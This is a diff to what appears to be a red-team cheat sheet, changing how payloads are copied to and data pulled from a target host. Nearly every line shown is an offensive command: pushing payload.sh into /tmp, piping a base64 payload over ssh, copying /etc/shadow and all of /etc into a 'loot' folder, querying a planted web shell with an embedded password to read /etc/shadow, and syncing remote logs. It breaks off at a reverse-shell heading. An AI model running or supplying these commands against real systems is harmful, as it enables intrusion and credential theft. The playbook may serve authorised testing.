@@ -679,11 +656,8 @@ ssh ANY_USER@TARGET   # password: rt2025!delta
 ### Drop files on a remote host
 
 ```bash
-# SCP (key auth)
-scp -i ~/.ssh/rt_ed25519 payload.sh root@TARGET:/tmp/
-
-# SCP (password auth via sshpass)
-sshpass -p 'PASS' scp payload.sh user@TARGET:/tmp/
+# SCP (will prompt for password)
+scp payload.sh root@TARGET:/tmp/
 
 # base64 over SSH (no SCP binary needed; lands in RAM)
 base64 -w0 payload.sh | ssh root@TARGET \
@@ -705,11 +679,8 @@ python3 -m http.server 8080
 ### Exfiltrate data from a remote host
 
 ```bash
-# SCP pull (key auth)
-scp -i ~/.ssh/rt_ed25519 root@TARGET:/etc/shadow ./loot/
-
-# SCP pull (password)
-sshpass -p 'PASS' scp user@TARGET:/etc/shadow ./loot/
+# SCP pull (will prompt for password)
+scp root@TARGET:/etc/shadow ./loot/
 
 # SSH + tar (entire directory, no intermediate file)
 ssh root@TARGET 'tar czf - /etc/' > loot/etc.tar.gz
@@ -734,7 +705,7 @@ ssh root@TARGET \
 curl 'http://TARGET/shell.php?p=rt2025!delta&act=read&f=/etc/shadow'
 
 # rsync (if available)
-rsync -avz -e "ssh -i ~/.ssh/rt_ed25519" root@TARGET:/var/log/ ./loot/logs/
+rsync -avz -e ssh root@TARGET:/var/log/ ./loot/logs/
 ```
 
 ### Establish a reverse shell
